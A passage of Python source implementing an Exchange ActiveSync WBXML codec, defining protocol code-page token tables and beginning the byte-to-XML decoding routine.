\"Recurrence\")\n\t\tpage.addToken(0x1C, \"Recurrence_Type\")\n\t\tpage.addToken(0x1D, \"Recurrence_Until\")\n\t\tpage.addToken(0x1E, \"Recurrence_Occurrences\")\n\t\tpage.addToken(0x1F, \"Recurrence_Interval\")\n\t\tpage.addToken(0x20, \"Recurrence_DayOfWeek\")\n\t\tpage.addToken(0x21, \"Recurrence_DayOfMonth\")\n\t\tpage.addToken(0x22, \"Recurrence_WeekOfMonth\")\n\t\tpage.addToken(0x23, \"Recurrence_MonthOfYear\")\n\t\tpage.addToken(0x24, \"Reminder\")\n\t\tpage.addToken(0x25, \"Sensitivity\")\n\t\tpage.addToken(0x26, \"Subject\")\n\t\tpage.addToken(0x27, \"StartTime\")\n\t\tpage.addToken(0x28, \"UID\")\n\t\tpage.addToken(0x29, \"Attendee_Status\")\n\t\tpage.addToken(0x2A, \"Attendee_Type\")\n\t\tpage.addToken(0x33, \"DisallowNewTimeProposal\")\n\t\tpage.addToken(0x34, \"ResponseRequested\")\n\t\tpage.addToken(0x35, \"AppointmentReplyTime\")\n\t\tpage.addToken(0x36, \"ResponseType\")\n\t\tpage.addToken(0x37, \"CalendarType\")\n\t\tpage.addToken(0x38, \"IsLeapMonth\")\n\t\tpage.addToken(0x39, \"FirstDayOfWeek\")\n\t\tpage.addToken(0x3A, \"OnlineMeetingConfLink\")\n\t\tpage.addToken(0x3B, \"OnlineMeetingExternalLink\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 5: Move\n\t\t# region Move Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Move:\"\n\t\tpage.xmlns = \"move\"\n\n\t\tpage.addToken(0x05, \"MoveItems\")\n\t\tpage.addToken(0x06, \"Move\")\n\t\tpage.addToken(0x07, \"SrcMsgId\")\n\t\tpage.addToken(0x08, \"SrcFldId\")\n\t\tpage.addToken(0x09, \"DstFldId\")\n\t\tpage.addToken(0x0A, \"Response\")\n\t\tpage.addToken(0x0B, \"Status\")\n\t\tpage.addToken(0x0C, \"DstMsgId\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 6: ItemEstimate\n\t\t# region ItemEstimate Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"GetItemEstimate:\"\n\t\tpage.xmlns = \"getitemestimate\"\n\n\t\tpage.addToken(0x05, \"GetItemEstimate\")\n\t\tpage.addToken(0x06, \"Version\")\n\t\tpage.addToken(0x07, \"Collections\")\n\t\tpage.addToken(0x08, \"Collection\")\n\t\tpage.addToken(0x09, \"Class\")\n\t\tpage.addToken(0x0A, \"CollectionId\")\n\t\tpage.addToken(0x0B, \"DateTime\")\n\t\tpage.addToken(0x0C, \"Estimate\")\n\t\tpage.addToken(0x0D, \"Response\")\n\t\tpage.addToken(0x0E, \"Status\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 7: FolderHierarchy\n\t\t# region FolderHierarchy Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"FolderHierarchy:\"\n\t\tpage.xmlns = \"folderhierarchy\"\n\n\t\tpage.addToken(0x07, \"DisplayName\")\n\t\tpage.addToken(0x08, \"ServerId\")\n\t\tpage.addToken(0x09, \"ParentId\")\n\t\tpage.addToken(0x0A, \"Type\")\n\t\tpage.addToken(0x0C, \"Status\")\n\t\tpage.addToken(0x0E, \"Changes\")\n\t\tpage.addToken(0x0F, \"Add\")\n\t\tpage.addToken(0x10, \"Delete\")\n\t\tpage.addToken(0x11, \"Update\")\n\t\tpage.addToken(0x12, \"SyncKey\")\n\t\tpage.addToken(0x13, \"FolderCreate\")\n\t\tpage.addToken(0x14, \"FolderDelete\")\n\t\tpage.addToken(0x15, \"FolderUpdate\")\n\t\tpage.addToken(0x16, \"FolderSync\")\n\t\tpage.addToken(0x17, \"Count\")\n\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 8: MeetingResponse\n\t\t# region MeetingResponse Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"MeetingResponse:\"\n\t\tpage.xmlns = \"meetingresponse\"\n\n\t\tpage.addToken(0x05, \"CalendarId\")\n\t\tpage.addToken(0x06, \"CollectionId\")\n\t\tpage.addToken(0x07, \"MeetingResponse\")\n\t\tpage.addToken(0x08, \"RequestId\")\n\t\tpage.addToken(0x09, \"Request\")\n\t\tpage.addToken(0x0A, \"Result\")\n\t\tpage.addToken(0x0B, \"Status\")\n\t\tpage.addToken(0x0C, \"UserResponse\")\n\t\tpage.addToken(0x0E, \"InstanceId\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 9: Tasks\n\t\t# region Tasks Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Tasks:\"\n\t\tpage.xmlns = \"tasks\"\n\n\t\tpage.addToken(0x08, \"Categories\")\n\t\tpage.addToken(0x09, \"Category\")\n\t\tpage.addToken(0x0A, \"Complete\")\n\t\tpage.addToken(0x0B, \"DateCompleted\")\n\t\tpage.addToken(0x0C, \"DueDate\")\n\t\tpage.addToken(0x0D, \"UTCDueDate\")\n\t\tpage.addToken(0x0E, \"Importance\")\n\t\tpage.addToken(0x0F, \"Recurrence\")\n\t\tpage.addToken(0x10, \"Recurrence_Type\")\n\t\tpage.addToken(0x11, \"Recurrence_Start\")\n\t\tpage.addToken(0x12, \"Recurrence_Until\")\n\t\tpage.addToken(0x13, \"Recurrence_Occurrences\")\n\t\tpage.addToken(0x14, \"Recurrence_Interval\")\n\t\tpage.addToken(0x15, \"Recurrence_DayOfMonth\")\n\t\tpage.addToken(0x16, \"Recurrence_DayOfWeek\")\n\t\tpage.addToken(0x17, \"Recurrence_WeekOfMonth\")\n\t\tpage.addToken(0x18, \"Recurrence_MonthOfYear\")\n\t\tpage.addToken(0x19, \"Recurrence_Regenerate\")\n\t\tpage.addToken(0x1A, \"Recurrence_DeadOccur\")\n\t\tpage.addToken(0x1B, \"ReminderSet\")\n\t\tpage.addToken(0x1C, \"ReminderTime\")\n\t\tpage.addToken(0x1D, \"Sensitivity\")\n\t\tpage.addToken(0x1E, \"StartDate\")\n\t\tpage.addToken(0x1F, \"UTCStartDate\")\n\t\tpage.addToken(0x20, \"Subject\")\n\t\tpage.addToken(0x22, \"OrdinalDate\")\n\t\tpage.addToken(0x23, \"SubOrdinalDate\")\n\t\tpage.addToken(0x24, \"CalendarType\")\n\t\tpage.addToken(0x25, \"IsLeapMonth\")\n\t\tpage.addToken(0x26, \"FirstDayOfWeek\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 10: ResolveRecipients\n\t\t# region ResolveRecipients Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"ResolveRecipients:\"\n\t\tpage.xmlns = \"resolverecipients\"\n\n\t\tpage.addToken(0x05, \"ResolveRecipients\")\n\t\tpage.addToken(0x06, \"Response\")\n\t\tpage.addToken(0x07, \"Status\")\n\t\tpage.addToken(0x08, \"Type\")\n\t\tpage.addToken(0x09, \"Recipient\")\n\t\tpage.addToken(0x0A, \"DisplayName\")\n\t\tpage.addToken(0x0B, \"EmailAddress\")\n\t\tpage.addToken(0x0C, \"Certificates\")\n\t\tpage.addToken(0x0D, \"Certificate\")\n\t\tpage.addToken(0x0E, \"MiniCertificate\")\n\t\tpage.addToken(0x0F, \"Options\")\n\t\tpage.addToken(0x10, \"To\")\n\t\tpage.addToken(0x11, \"CertificateRetrieval\")\n\t\tpage.addToken(0x12, \"RecipientCount\")\n\t\tpage.addToken(0x13, \"MaxCertificates\")\n\t\tpage.addToken(0x14, \"MaxAmbiguousRecipients\")\n\t\tpage.addToken(0x15, \"CertificateCount\")\n\t\tpage.addToken(0x16, \"Availability\")\n\t\tpage.addToken(0x17, \"StartTime\")\n\t\tpage.addToken(0x18, \"EndTime\")\n\t\tpage.addToken(0x19, \"MergedFreeBusy\")\n\t\tpage.addToken(0x1A, \"Picture\")\n\t\tpage.addToken(0x1B, \"MaxSize\")\n\t\tpage.addToken(0x1C, \"Data\")\n\t\tpage.addToken(0x1D, \"MaxPictures\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 11: ValidateCert\n\t\t# region ValidateCert Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"ValidateCert:\"\n\t\tpage.xmlns = \"validatecert\"\n\n\t\tpage.addToken(0x05, \"ValidateCert\")\n\t\tpage.addToken(0x06, \"Certificates\")\n\t\tpage.addToken(0x07, \"Certificate\")\n\t\tpage.addToken(0x08, \"CertificateChain\")\n\t\tpage.addToken(0x09, \"CheckCRL\")\n\t\tpage.addToken(0x0A, \"Status\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 12: Contacts2\n\t\t# region Contacts2 Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Contacts2:\"\n\t\tpage.xmlns = \"contacts2\"\n\n\t\tpage.addToken(0x05, \"CustomerId\")\n\t\tpage.addToken(0x06, \"GovernmentId\")\n\t\tpage.addToken(0x07, \"IMAddress\")\n\t\tpage.addToken(0x08, \"IMAddress2\")\n\t\tpage.addToken(0x09, \"IMAddress3\")\n\t\tpage.addToken(0x0A, \"ManagerName\")\n\t\tpage.addToken(0x0B, \"CompanyMainPhone\")\n\t\tpage.addToken(0x0C, \"AccountName\")\n\t\tpage.addToken(0x0D, \"NickName\")\n\t\tpage.addToken(0x0E, \"MMS\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 13: Ping\n\t\t# region Ping Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Ping:\"\n\t\tpage.xmlns = \"ping\"\n\n\t\tpage.addToken(0x05, \"Ping\")\n\t\tpage.addToken(0x06, \"AutdState\")  # Per MS-ASWBXML, this tag is not used by protocol\n\t\tpage.addToken(0x07, \"Status\")\n\t\tpage.addToken(0x08, \"HeartbeatInterval\")\n\t\tpage.addToken(0x09, \"Folders\")\n\t\tpage.addToken(0x0A, \"Folder\")\n\t\tpage.addToken(0x0B, \"Id\")\n\t\tpage.addToken(0x0C, \"Class\")\n\t\tpage.addToken(0x0D, \"MaxFolders\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 14: Provision\n\t\t# region Provision Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Provision:\"\n\t\tpage.xmlns = \"provision\"\n\n\t\tpage.addToken(0x05, \"Provision\")\n\t\tpage.addToken(0x06, \"Policies\")\n\t\tpage.addToken(0x07, \"Policy\")\n\t\tpage.addToken(0x08, \"PolicyType\")\n\t\tpage.addToken(0x09, \"PolicyKey\")\n\t\tpage.addToken(0x0A, \"Data\")\n\t\tpage.addToken(0x0B, \"Status\")\n\t\tpage.addToken(0x0C, \"RemoteWipe\")\n\t\tpage.addToken(0x0D, \"EASProvisionDoc\")\n\t\tpage.addToken(0x0E, \"DevicePasswordEnabled\")\n\t\tpage.addToken(0x0F, \"AlphanumericDevicePasswordRequired\")\n\t\tpage.addToken(0x10, \"RequireStorageCardEncryption\")\n\t\tpage.addToken(0x11, \"PasswordRecoveryEnabled\")\n\t\tpage.addToken(0x13, \"AttachmentsEnabled\")\n\t\tpage.addToken(0x14, \"MinDevicePasswordLength\")\n\t\tpage.addToken(0x15, \"MaxInactivityTimeDeviceLock\")\n\t\tpage.addToken(0x16, \"MaxDevicePasswordFailedAttempts\")\n\t\tpage.addToken(0x17, \"MaxAttachmentSize\")\n\t\tpage.addToken(0x18, \"AllowSimpleDevicePassword\")\n\t\tpage.addToken(0x19, \"DevicePasswordExpiration\")\n\t\tpage.addToken(0x1A, \"DevicePasswordHistory\")\n\t\tpage.addToken(0x1B, \"AllowStorageCard\")\n\t\tpage.addToken(0x1C, \"AllowCamera\")\n\t\tpage.addToken(0x1D, \"RequireDeviceEncryption\")\n\t\tpage.addToken(0x1E, \"AllowUnsignedApplications\")\n\t\tpage.addToken(0x1F, \"AllowUnsignedInstallationPackages\")\n\t\tpage.addToken(0x20, \"MinDevicePasswordComplexCharacters\")\n\t\tpage.addToken(0x21, \"AllowWiFi\")\n\t\tpage.addToken(0x22, \"AllowTextMessaging\")\n\t\tpage.addToken(0x23, \"AllowPOPIMAPEmail\")\n\t\tpage.addToken(0x24, \"AllowBluetooth\")\n\t\tpage.addToken(0x25, \"AllowIrDA\")\n\t\tpage.addToken(0x26, \"RequireManualSyncWhenRoaming\")\n\t\tpage.addToken(0x27, \"AllowDesktopSync\")\n\t\tpage.addToken(0x28, \"MaxCalendarAgeFilter\")\n\t\tpage.addToken(0x29, \"AllowHTMLEmail\")\n\t\tpage.addToken(0x2A, \"MaxEmailAgeFilter\")\n\t\tpage.addToken(0x2B, \"MaxEmailBodyTruncationSize\")\n\t\tpage.addToken(0x2C, \"MaxEmailHTMLBodyTruncationSize\")\n\t\tpage.addToken(0x2D, \"RequireSignedSMIMEMessages\")\n\t\tpage.addToken(0x2E, \"RequireEncryptedSMIMEMessages\")\n\t\tpage.addToken(0x2F, \"RequireSignedSMIMEAlgorithm\")\n\t\tpage.addToken(0x30, \"RequireEncryptionSMIMEAlgorithm\")\n\t\tpage.addToken(0x31, \"AllowSMIMEEncryptionAlgorithmNegotiation\")\n\t\tpage.addToken(0x32, \"AllowSMIMESoftCerts\")\n\t\tpage.addToken(0x33, \"AllowBrowser\")\n\t\tpage.addToken(0x34, \"AllowConsumerEmail\")\n\t\tpage.addToken(0x35, \"AllowRemoteDesktop\")\n\t\tpage.addToken(0x36, \"AllowInternetSharing\")\n\t\tpage.addToken(0x37, \"UnapprovedInROMApplicationList\")\n\t\tpage.addToken(0x38, \"ApplicationName\")\n\t\tpage.addToken(0x39, \"ApprovedApplicationList\")\n\t\tpage.addToken(0x3A, \"Hash\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 15: Search\n\t\t# region Search Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Search:\"\n\t\tpage.xmlns = \"search\"\n\n\t\tpage.addToken(0x05, \"Search\")\n\t\tpage.addToken(0x07, \"Store\")\n\t\tpage.addToken(0x08, \"Name\")\n\t\tpage.addToken(0x09, \"Query\")\n\t\tpage.addToken(0x0A, \"Options\")\n\t\tpage.addToken(0x0B, \"Range\")\n\t\tpage.addToken(0x0C, \"Status\")\n\t\tpage.addToken(0x0D, \"Response\")\n\t\tpage.addToken(0x0E, \"Result\")\n\t\tpage.addToken(0x0F, \"Properties\")\n\t\tpage.addToken(0x10, \"Total\")\n\t\tpage.addToken(0x11, \"EqualTo\")\n\t\tpage.addToken(0x12, \"Value\")\n\t\tpage.addToken(0x13, \"And\")\n\t\tpage.addToken(0x14, \"Or\")\n\t\tpage.addToken(0x15, \"FreeText\")\n\t\tpage.addToken(0x17, \"DeepTraversal\")\n\t\tpage.addToken(0x18, \"LongId\")\n\t\tpage.addToken(0x19, \"RebuildResults\")\n\t\tpage.addToken(0x1A, \"LessThan\")\n\t\tpage.addToken(0x1B, \"GreaterThan\")\n\t\tpage.addToken(0x1E, \"UserName\")\n\t\tpage.addToken(0x1F, \"Password\")\n\t\tpage.addToken(0x20, \"ConversationId\")\n\t\tpage.addToken(0x21, \"Picture\")\n\t\tpage.addToken(0x22, \"MaxSize\")\n\t\tpage.addToken(0x23, \"MaxPictures\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 16: GAL\n\t\t# region GAL Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"GAL:\"\n\t\tpage.xmlns = \"gal\"\n\n\t\tpage.addToken(0x05, \"DisplayName\")\n\t\tpage.addToken(0x06, \"Phone\")\n\t\tpage.addToken(0x07, \"Office\")\n\t\tpage.addToken(0x08, \"Title\")\n\t\tpage.addToken(0x09, \"Company\")\n\t\tpage.addToken(0x0A, \"Alias\")\n\t\tpage.addToken(0x0B, \"FirstName\")\n\t\tpage.addToken(0x0C, \"LastName\")\n\t\tpage.addToken(0x0D, \"HomePhone\")\n\t\tpage.addToken(0x0E, \"MobilePhone\")\n\t\tpage.addToken(0x0F, \"EmailAddress\")\n\t\tpage.addToken(0x10, \"Picture\")\n\t\tpage.addToken(0x11, \"Status\")\n\t\tpage.addToken(0x12, \"Data\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 17: AirSyncBase\n\t\t# region AirSyncBase Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"AirSyncBase:\"\n\t\tpage.xmlns = \"airsyncbase\"\n\n\t\tpage.addToken(0x05, \"BodyPreference\")\n\t\tpage.addToken(0x06, \"Type\")\n\t\tpage.addToken(0x07, \"TruncationSize\")\n\t\tpage.addToken(0x08, \"AllOrNone\")\n\t\tpage.addToken(0x0A, \"Body\")\n\t\tpage.addToken(0x0B, \"Data\")\n\t\tpage.addToken(0x0C, \"EstimatedDataSize\")\n\t\tpage.addToken(0x0D, \"Truncated\")\n\t\tpage.addToken(0x0E, \"Attachments\")\n\t\tpage.addToken(0x0F, \"Attachment\")\n\t\tpage.addToken(0x10, \"DisplayName\")\n\t\tpage.addToken(0x11, \"FileReference\")\n\t\tpage.addToken(0x12, \"Method\")\n\t\tpage.addToken(0x13, \"ContentId\")\n\t\tpage.addToken(0x14, \"ContentLocation\")\n\t\tpage.addToken(0x15, \"IsInline\")\n\t\tpage.addToken(0x16, \"NativeBodyType\")\n\t\tpage.addToken(0x17, \"ContentType\")\n\t\tpage.addToken(0x18, \"Preview\")\n\t\tpage.addToken(0x19, \"BodyPartPreference\")\n\t\tpage.addToken(0x1A, \"BodyPart\")\n\t\tpage.addToken(0x1B, \"Status\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 18: Settings\n\t\t# region Settings Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Settings:\"\n\t\tpage.xmlns = \"settings\"\n\n\t\tpage.addToken(0x05, \"Settings\")\n\t\tpage.addToken(0x06, \"Status\")\n\t\tpage.addToken(0x07, \"Get\")\n\t\tpage.addToken(0x08, \"Set\")\n\t\tpage.addToken(0x09, \"Oof\")\n\t\tpage.addToken(0x0A, \"OofState\")\n\t\tpage.addToken(0x0B, \"StartTime\")\n\t\tpage.addToken(0x0C, \"EndTime\")\n\t\tpage.addToken(0x0D, \"OofMessage\")\n\t\tpage.addToken(0x0E, \"AppliesToInternal\")\n\t\tpage.addToken(0x0F, \"AppliesToExternalKnown\")\n\t\tpage.addToken(0x10, \"AppliesToExternalUnknown\")\n\t\tpage.addToken(0x11, \"Enabled\")\n\t\tpage.addToken(0x12, \"ReplyMessage\")\n\t\tpage.addToken(0x13, \"BodyType\")\n\t\tpage.addToken(0x14, \"DevicePassword\")\n\t\tpage.addToken(0x15, \"Password\")\n\t\tpage.addToken(0x16, \"DeviceInformation\")\n\t\tpage.addToken(0x17, \"Model\")\n\t\tpage.addToken(0x18, \"IMEI\")\n\t\tpage.addToken(0x19, \"FriendlyName\")\n\t\tpage.addToken(0x1A, \"OS\")\n\t\tpage.addToken(0x1B, \"OSLanguage\")\n\t\tpage.addToken(0x1C, \"PhoneNumber\")\n\t\tpage.addToken(0x1D, \"UserInformation\")\n\t\tpage.addToken(0x1E, \"EmailAddresses\")\n\t\tpage.addToken(0x1F, \"SmtpAddress\")\n\t\tpage.addToken(0x20, \"UserAgent\")\n\t\tpage.addToken(0x21, \"EnableOutboundSMS\")\n\t\tpage.addToken(0x22, \"MobileOperator\")\n\t\tpage.addToken(0x23, \"PrimarySmtpAddress\")\n\t\tpage.addToken(0x24, \"Accounts\")\n\t\tpage.addToken(0x25, \"Account\")\n\t\tpage.addToken(0x26, \"AccountId\")\n\t\tpage.addToken(0x27, \"AccountName\")\n\t\tpage.addToken(0x28, \"UserDisplayName\")\n\t\tpage.addToken(0x29, \"SendDisabled\")\n\t\tpage.addToken(0x2B, \"RightsManagementInformation\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 19: DocumentLibrary\n\t\t# region DocumentLibrary Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"DocumentLibrary:\"\n\t\tpage.xmlns = \"documentlibrary\"\n\n\t\tpage.addToken(0x05, \"LinkId\")\n\t\tpage.addToken(0x06, \"DisplayName\")\n\t\tpage.addToken(0x07, \"IsFolder\")\n\t\tpage.addToken(0x08, \"CreationDate\")\n\t\tpage.addToken(0x09, \"LastModifiedDate\")\n\t\tpage.addToken(0x0A, \"IsHidden\")\n\t\tpage.addToken(0x0B, \"ContentLength\")\n\t\tpage.addToken(0x0C, \"ContentType\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 20: ItemOperations\n\t\t# region ItemOperations Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"ItemOperations:\"\n\t\tpage.xmlns = \"itemoperations\"\n\n\t\tpage.addToken(0x05, \"ItemOperations\")\n\t\tpage.addToken(0x06, \"Fetch\")\n\t\tpage.addToken(0x07, \"Store\")\n\t\tpage.addToken(0x08, \"Options\")\n\t\tpage.addToken(0x09, \"Range\")\n\t\tpage.addToken(0x0A, \"Total\")\n\t\tpage.addToken(0x0B, \"Properties\")\n\t\tpage.addToken(0x0C, \"Data\")\n\t\tpage.addToken(0x0D, \"Status\")\n\t\tpage.addToken(0x0E, \"Response\")\n\t\tpage.addToken(0x0F, \"Version\")\n\t\tpage.addToken(0x10, \"Schema\")\n\t\tpage.addToken(0x11, \"Part\")\n\t\tpage.addToken(0x12, \"EmptyFolderContents\")\n\t\tpage.addToken(0x13, \"DeleteSubFolders\")\n\t\tpage.addToken(0x14, \"UserName\")\n\t\tpage.addToken(0x15, \"Password\")\n\t\tpage.addToken(0x16, \"Move\")\n\t\tpage.addToken(0x17, \"DstFldId\")\n\t\tpage.addToken(0x18, \"ConversationId\")\n\t\tpage.addToken(0x19, \"MoveAlways\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 21: ComposeMail\n\t\t# region ComposeMail Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"ComposeMail:\"\n\t\tpage.xmlns = \"composemail\"\n\n\t\tpage.addToken(0x05, \"SendMail\")\n\t\tpage.addToken(0x06, \"SmartForward\")\n\t\tpage.addToken(0x07, \"SmartReply\")\n\t\tpage.addToken(0x08, \"SaveInSentItems\")\n\t\tpage.addToken(0x09, \"ReplaceMime\")\n\t\tpage.addToken(0x0B, \"Source\")\n\t\tpage.addToken(0x0C, \"FolderId\")\n\t\tpage.addToken(0x0D, \"ItemId\")\n\t\tpage.addToken(0x0E, \"LongId\")\n\t\tpage.addToken(0x0F, \"InstanceId\")\n\t\tpage.addToken(0x10, \"MIME\")\n\t\tpage.addToken(0x11, \"ClientId\")\n\t\tpage.addToken(0x12, \"Status\")\n\t\tpage.addToken(0x13, \"AccountId\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 22: Email2\n\t\t# region Email2 Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Email2:\"\n\t\tpage.xmlns = \"email2\"\n\n\t\tpage.addToken(0x05, \"UmCallerID\")\n\t\tpage.addToken(0x06, \"UmUserNotes\")\n\t\tpage.addToken(0x07, \"UmAttDuration\")\n\t\tpage.addToken(0x08, \"UmAttOrder\")\n\t\tpage.addToken(0x09, \"ConversationId\")\n\t\tpage.addToken(0x0A, \"ConversationIndex\")\n\t\tpage.addToken(0x0B, \"LastVerbExecuted\")\n\t\tpage.addToken(0x0C, \"LastVerbExecutionTime\")\n\t\tpage.addToken(0x0D, \"ReceivedAsBcc\")\n\t\tpage.addToken(0x0E, \"Sender\")\n\t\tpage.addToken(0x0F, \"CalendarType\")\n\t\tpage.addToken(0x10, \"IsLeapMonth\")\n\t\tpage.addToken(0x11, \"AccountId\")\n\t\tpage.addToken(0x12, \"FirstDayOfWeek\")\n\t\tpage.addToken(0x13, \"MeetingMessageType\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 23: Notes\n\t\t# region Notes Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"Notes:\"\n\t\tpage.xmlns = \"notes\"\n\n\t\tpage.addToken(0x05, \"Subject\")\n\t\tpage.addToken(0x06, \"MessageClass\")\n\t\tpage.addToken(0x07, \"LastModifiedDate\")\n\t\tpage.addToken(0x08, \"Categories\")\n\t\tpage.addToken(0x09, \"Category\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\n\t\t# Code Page 24: RightsManagement\n\t\t# region RightsManagement Code Page\n\t\tpage = ASWBXMLCodePage()\n\t\tpage.namespace = \"RightsManagement:\"\n\t\tpage.xmlns = \"rightsmanagement\"\n\n\t\tpage.addToken(0x05, \"RightsManagementSupport\")\n\t\tpage.addToken(0x06, \"RightsManagementTemplates\")\n\t\tpage.addToken(0x07, \"RightsManagementTemplate\")\n\t\tpage.addToken(0x08, \"RightsManagementLicense\")\n\t\tpage.addToken(0x09, \"EditAllowed\")\n\t\tpage.addToken(0x0A, \"ReplyAllowed\")\n\t\tpage.addToken(0x0B, \"ReplyAllAllowed\")\n\t\tpage.addToken(0x0C, \"ForwardAllowed\")\n\t\tpage.addToken(0x0D, \"ModifyRecipientsAllowed\")\n\t\tpage.addToken(0x0E, \"ExtractAllowed\")\n\t\tpage.addToken(0x0F, \"PrintAllowed\")\n\t\tpage.addToken(0x10, \"ExportAllowed\")\n\t\tpage.addToken(0x11, \"ProgrammaticAccessAllowed\")\n\t\tpage.addToken(0x12, \"RMOwner\")\n\t\tpage.addToken(0x13, \"ContentExpiryDate\")\n\t\tpage.addToken(0x14, \"TemplateID\")\n\t\tpage.addToken(0x15, \"TemplateName\")\n\t\tpage.addToken(0x16, \"TemplateDescription\")\n\t\tpage.addToken(0x17, \"ContentOwner\")\n\t\tpage.addToken(0x18, \"RemoveRightsManagementDistribution\")\n\t\tself.codePages.append(page)\n\t\t# endregion\n\t\t# endregion\n\t\n\tdef loadXml(self, strXML):\n\t\t# note xmlDoc has .childNodes and .parentNode\n\t\tself.xmlDoc = xml.dom.minidom.parseString(strXML)\n\n\tdef getXml(self):\n\t\tif (self.xmlDoc != None):\n\t\t\ttry:\n\t\t\t\treturn self.xmlDoc.toprettyxml(indent=\"    \", newl=\"\\n\")\n\t\t\texcept:\n\t\t\t\treturn self.xmlDoc.toxml()\n\t\n\tdef loadBytes(self, byteWBXML):\n\t\t\n\t\tcurrentNode = self.xmlDoc\n\t\t\n\t\twbXMLBytes = ASWBXMLByteQueue(byteWBXML)\n\t\t# Version is ignored\n\t\tversion = wbXMLBytes.dequeueAndLog()\n\n\t\t# Public Identifier is ignored\n\t\tpublicId = wbXMLBytes.dequeueMultibyteInt()\n\t\t\n\t\tlogging.debug(\"Version: %d, Public Identifier: %d\" % (version, publicId))\n\t\t\n\t\t# Character set\n\t\t# Currently only UTF-8 is supported, throw if something else\n\t\tcharset = wbXMLBytes.dequeueMultibyteInt()\n\t\tif (charset != 0x6A):\n\t\t\traise InvalidDataException(\"ASWBXML only supports UTF-8 encoded XML.\")\n\n\t\t# String table length\n\t\t# This should be 0, MS-ASWBXML does not use string tables\n\t\tstringTableLength = wbXMLBytes.dequeueMultibyteInt()\n\t\tif (stringTableLength != 0):\n\t\t\traise InvalidDataException(\"WBXML data contains a string table.\")\n\n\t\t# Now we should be at the body of the data.\n\t\t# Add the declaration\n\t\tunusedArray = [GlobalTokens.ENTITY, GlobalTokens.EXT_0, GlobalTokens.EXT_1, GlobalTokens.EXT_2, GlobalTokens.EXT_I_0, GlobalTokens.EXT_I_1, GlobalTokens.EXT_I_2, GlobalTokens.EXT_T_0, GlobalTokens.EXT_T_1, GlobalTokens.EXT_T_2, GlobalTokens.LITERAL, GlobalTokens.LITERAL_A, GlobalTokens.LITERAL_AC, GlobalTokens.LITERAL_C, GlobalTokens.PI, GlobalTokens.STR_T]\n\t\t\n\t\twhile ( wbXMLBytes.qsize() > 0):\n\t\t\tcurrentByte = wbXMLBytes.dequeueAndLog()\n\t\t\tif ( currentByte == GlobalTokens.SWITCH_PAGE ):\n\t\t\t\tnewCodePage = wbXMLBytes.dequeueAndLog()\n\t\t\t\tif (newCodePage >= 0 and newCodePage < 25):\n\t\t\t\t\tself.currentCodePage = newCodePage\n\t\t\t\telse:\n\t\t\t\t\traise InvalidDataException(\"Unknown code page ID 0x{0:X} encountered in WBXML\".format(currentByte))\n\t\t\telif  ( currentByte == GlobalTokens.END ):\n\t\t\t\tif (currentNode != None and currentNode.parentNode != None):\n\t\t\t\t\tcurrentNode = currentNode.parentNode\n\t\t\t\telse:\n\t\t\t\t\traise InvalidDataException(\"END global token encountered out of sequence\")\n\t\t\t\t\tbreak\n\t\t\telif  ( currentByte == GlobalTokens.OPAQUE ):\n\t\t\t\tCDATALength = wbXMLBytes.dequeueMultibyteInt()\n\t\t\t\tnewOpaqueNode = self.xmlDoc.createCDATASection(wbXMLBytes.dequeueString(CDATALength))\n\t\t\t\tcurrentNode.appendChild(newOpaqueNode)\n\n\t\t\telif  ( currentByte == GlobalTokens.STR_I ):\n\t\t\t\tnewTextNode = self.xmlDoc.createTextNode(wbXMLBytes.dequeueString())\n\t\t\t\tcurrentNode.appendChild(newTextNode)\n\n\t\t\telif ( currentByte in unusedArray):\n\t\t\t\traise InvalidDataException(\"Encountered unknown global token 0x{0:X}.\".format(currentByte))\n\t\t\telse:\n\t\t\t\thasAttributes = (currentByte & 0x80) > 0\n\t\t\t\thasContent = (currentByte & 0x40) > 